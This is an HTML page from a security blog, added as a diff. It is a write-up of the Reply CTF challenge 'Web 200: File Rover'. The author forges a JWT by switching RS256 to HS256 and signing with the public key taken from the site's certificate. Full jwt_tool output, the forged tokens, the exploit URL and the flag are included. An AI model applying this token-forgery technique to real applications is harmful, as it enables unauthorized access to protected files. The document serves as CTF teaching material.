@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+
+<meta name="description" content="A tasteful blog about Computer Security and cars. I break stuff unintentionally so you don&#39;t have to.">
+
+<meta name="twitter:card" content="summary">
+<meta name="twitter:domain" content="https://tasteofsecurity.com/">
+
+<meta name="twitter:image" content="https://tasteofsecurity.com/tn.png">
+<meta name="twitter:title" property="og:title" itemprop="title name" content="A taste of security">
+<meta name="twitter:description" property="og:description" itemprop="description" content="A tasteful blog about Computer Security and cars. I break stuff unintentionally so you don&#39;t have to.">
+<meta name="og:type" content="website">
+<meta name="og:url" content="https://tasteofsecurity.com/">
+<meta name="og:image" itemprop="image primaryImageOfPage" content="https://tasteofsecurity.com/tn.png">
+
+<link rel="shortcut icon" href="https://tasteofsecurity.com/sam.ico" id="favicon">
+<link rel="stylesheet" href="https://tasteofsecurity.com/css/style.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Didact+Gothic">
+
+    
+
+    
+    
+    
+    <title>
+        
+        Web 200: File Rover CTF Challenge
+        
+    </title>
+</head>
+
+<body>
+    <div class="wrap">
+        <div class="section" id="title">Web 200: File Rover CTF Challenge</div>
+
+        
+<div class="section" id="content">
+    Sat Oct 12, 2019  &#183; 4 min read
+    
+    <div class="tag-container">
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/web">
+                web
+            </a>
+        </span>
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/ctf">
+                ctf
+            </a>
+        </span>
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/jwt">
+                jwt
+            </a>
+        </span>
+        
+    </div>
+    
+    <hr/>
+    <p><strong>CTF:</strong> <a href="https://ctftime.org/event/888">https://ctftime.org/event/888</a></p>
+<p><img src="/images/ctf/reply/Untitled-b55a7cb3-04fe-4059-aa33-b8b99d30414a.png" alt=""></p>
+<p>When connecting to the challenge, we get a SSL error.</p>
+<p><img src="/images/ctf/reply/Untitled-41d61b6a-68b8-43e9-bb73-961a2fd07b5a.png" alt=""></p>
+<p>When checking out the other web challenges only this challenge use SSL. I took a note of this.</p>
+<p>This is what the challenge looks like after telling chrome it&rsquo;s okay to connect.</p>
+<p><img src="/images/ctf/reply/Untitled-5e1bdab7-ac36-4d4b-9113-17260e8117e9.png" alt=""></p>
+<p>In the source code we also see a few other files that are interesting.</p>
+<pre><code>&lt;!--
+            &lt;tr&gt;
+                &lt;td&gt;flag.txt&lt;/td&gt;
+                &lt;td&gt;4 Bytes&lt;/td&gt;
+                &lt;td class=&quot;download-col&quot;&gt;
+                    &lt;button type=&quot;button&quot; class=&quot;btn btn-light&quot; disabled=&quot;disabled&quot;&gt;EXPIRED&lt;/button&gt;
+                &lt;/td&gt;
+            &lt;/tr&gt;
+--&gt;
+</code></pre>
+<p>The download function looks like this</p>
+<pre><code>&lt;a href=&quot;download.php?file=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJmaWxlbmFtZSI6IjdiNDIxZGYxMWE1M2UzM2Q5MjllZjRjMDI1Zjc5ZjgzIn0.dNHioi9RiEpyUtcOD6G5CBXU0EUi2HTl05eOvkFecmyoFyn5CWq5ExbwYLX8QE85qBaskOT-mtq3_XWwTxmGIKhPg8eOVuqqhU7nCg2eEdKwp-mjaPBnmDfBinvcfXEhItLi8T1hmMVgxaWSxQ1ZZKu4t-SFbuHOgesE6s9oBBiFMX92HSJbE3PnpAp6y6CYsI4hXBdzfAXERfmV0lV8-SRtKgKFwVTI-zmBlEGSReszw-NoDgGfFGF9e1tKjVb8sE3o5IYv5M5AmDjs8qWe5JO39IQeTJqn4r6Db6zPWjHKlheqFLrfytWQF9MvjDRU5CIu3tIRWYnylnVUA3Slrw&quot; title=&quot;Download File&quot; target=&quot;_blank&quot; class=&quot;btn btn-primary&quot; role=&quot;button&quot;&gt;Download&lt;/a&gt;
+</code></pre>
+<p>It looks like base64 json since the string starts with <code>ey</code>.</p>
+<p>Decoding it gave us some clues that it&rsquo;s JWT.</p>
+<p>Using <a href="https://jwt.io/">https://jwt.io/</a> we can decode the JWT data which consists of:</p>
+<ul>
+<li>Payload</li>
+<li>Header</li>
+<li>Signature</li>
+</ul>
+<p><img src="/images/ctf/reply/Untitled-47a75c76-ce5b-49e1-a071-d3711957f354.png" alt=""></p>
+<p>From the data we see that the algoritm is <code>RS256</code> and the payload consists of a filename that is md5.</p>
+<pre><code>md5(future.jpg) = 7b421df11a53e33d929ef4c025f79f83
+</code></pre>
+<h3 id="goal">Goal</h3>
+<p>Our goal is to bypass the signature or forge our own signature so we can download <code>flag.txt</code></p>
+<h3 id="jwt-exploit-1">JWT exploit 1</h3>
+<p>CVE-2015-2951 is basically a vulnerability in the JWT that allows you to change the algorithm to None and then remove the signature. More information here: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token#jwt-signature---none-algorithm">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON Web Token#jwt-signature&mdash;none-algorithm</a>.</p>
+<p>TL;DR This will allow you to forge any payload you want.</p>
+<p>I tried this bypass but it didn&rsquo;t work.</p>
+<pre><code>GET /download.php?file=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJmaWxlbmFtZSI6IjhhNTNlMGE4NzMyMGNiMGMxYzcyMzk3MWI2Y2FiMWM5In0. HTTP/1.1
+Host: gamebox3.reply.it:20443
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+
+Invalid Token
+</code></pre>
+<h3 id="jwt-exploit-2">JWT exploit 2</h3>
+<p>If you don&rsquo;t know how this bypass work, you can read more here: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token#jwt-signature---rs256-to-hs256">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON Web Token#jwt-signature&mdash;rs256-to-hs256</a>.</p>
+<p>For the second bypass I used this tool: <a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a>.</p>
+<p>Remember from earlier when we had a SSL error. We can download the certificate from the challenge and export it to a file with chrome.</p>
+<p>I exported the certificate as <code>cert.pem</code>.</p>
+<p>From the certificate we can extract the public key with this command</p>
+<pre><code>$ openssl x509 -pubkey -noout -in cert.pem &gt; pubkey.pem
+</code></pre>
+<p>I will now use the <code>jwt_tool</code>and the bypass <code>&quot;public key bypass in RSA mode&quot;</code>.</p>
+<pre><code>$ python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmaWxlbmFtZSI6IjdiNDIxZGYxMWE1M2UzM2Q5MjllZjRjMDI1Zjc5ZjgzIn0.EaLNFE2h93_bBy_1LtyMiTrdXMwxs75yxS07_LnT_xs
+
+,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
+----''----''----''----''----''----''----''----''----''----'
+     ,--.,--.   ,--.,--------.,--------.             ,--.
+     |  ||  |   |  |'--.  .--''--.  .--',---.  ,---. |  |
+,--. |  ||  |.'.|  |   |  |      |  |  | .-. || .-. ||  |
+|  '-'  /|   ,'.   |   |  |,----.|  |  ' '-' '' '-' '|  |
+ `-----' '--'   '--'   `--''----'`--'   `---'  `---' `--'
+,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
+'----''----''----''----''----''----''----''----''----''----'
+
+Token header values:
+[+] typ = JWT
+[+] alg = HS256
+
+Token payload values:
+[+] filename = 7b421df11a53e33d929ef4c025f79f83
+
+######################################################
+# Options:                                           #
+# 1: Check CVE-2015-2951 - alg=None vulnerability    #
+# 2: Check for Public Key bypass in RSA mode         #
+# 3: Check signature against a key                   #
+# 4: Check signature against a key file (&quot;kid&quot;)      #
+# 5: Crack signature with supplied dictionary file   #
+# 6: Tamper with payload data (key required to sign) #
+# 0: Quit                                            #
+######################################################
+
+Please make a selection (1-6)
+&gt; 6
+
+Token header values:
+[1] typ = JWT
+[2] alg = HS256
+[3] *ADD A VALUE*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+&gt; 0
+
+Token payload values:
+[1] filename = 7b421df11a53e33d929ef4c025f79f83
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+&gt; 1
+
+Current value of filename is: 7b421df11a53e33d929ef4c025f79f83
+Please enter new value and hit ENTER
+&gt; 159df48875627e2f7f66dae584c5e3a5
+[1] filename = 159df48875627e2f7f66dae584c5e3a5
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+&gt; 0
+
+Token Signing:
+[1] Sign token with known key
+[2] Strip signature from token vulnerable to CVE-2015-2951
+[3] Sign with Public Key bypass vulnerability
+[4] Sign token with key file
+
+Please select an option from above (1-4):
+&gt; 3
+
+Please enter the Public Key filename:
+&gt; pubkey.pem
+eyJmaWxlbmFtZSI6IjE1OWRmNDg4NzU2MjdlMmY3ZjY2ZGFlNTg0YzVlM2E1In0
+
+Set this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).
+(This will only be valid on unpatched implementations of JWT.)
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmaWxlbmFtZSI6IjE1OWRmNDg4NzU2MjdlMmY3ZjY2ZGFlNTg0YzVlM2E1In0.gkPHJYEXF0WEpvwzI4FxDkFGoG6dpBvVMhq6ibsl28w
+</code></pre>
+<h3 id="summary">Summary</h3>
+<ul>
+<li>Change algorithm from <code>RS256</code> to <code>HS256</code></li>
+<li>Set filename to<code>md5(flag.txt) = 159df48875627e2f7f66dae584c5e3a5</code></li>
+<li>Sign it with the public key</li>
+<li><a href="https://gamebox3.reply.it:20443/download.php?file=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmaWxlbmFtZSI6IjE1OWRmNDg4NzU2MjdlMmY3ZjY2ZGFlNTg0YzVlM2E1In0.gkPHJYEXF0WEpvwzI4FxDkFGoG6dpBvVMhq6ibsl28w">https://gamebox3.reply.it:20443/download.php?file=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmaWxlbmFtZSI6IjE1OWRmNDg4NzU2MjdlMmY3ZjY2ZGFlNTg0YzVlM2E1In0.gkPHJYEXF0WEpvwzI4FxDkFGoG6dpBvVMhq6ibsl28w</a></li>
+<li>Go to that link and it will download the flag: <code>{FLG:n0_b4ckup_n0_m3rcy}</code>.</li>
+</ul>
+
+</div>
+
+
+        
+<div class="section bottom-menu">
+    
+<hr />
+<p>
+
+
+    
+        <a href="/security">back</a>
+        
+            &#183;
+        
+    
+    <a href="https://tasteofsecurity.com/">
+        #root
+    </a>
+    &#183; 
+    
+        
+            <a href="/security/">
+                A taste of security
+            </a>
+        
+    
+    
+        
+            &#183; 
+            <a href="/how-to/">
+                Break it, fix it.
+            </a>
+        
+            &#183; 
+            <a href="/about">
+                I&#39;m Hugo
+            </a>
+        
+    
+
+</p>
+
+</div>
+
+
+        <div class="section footer">© 2023 Hugo</div>
+    </div>
+</body>
+
+</html>
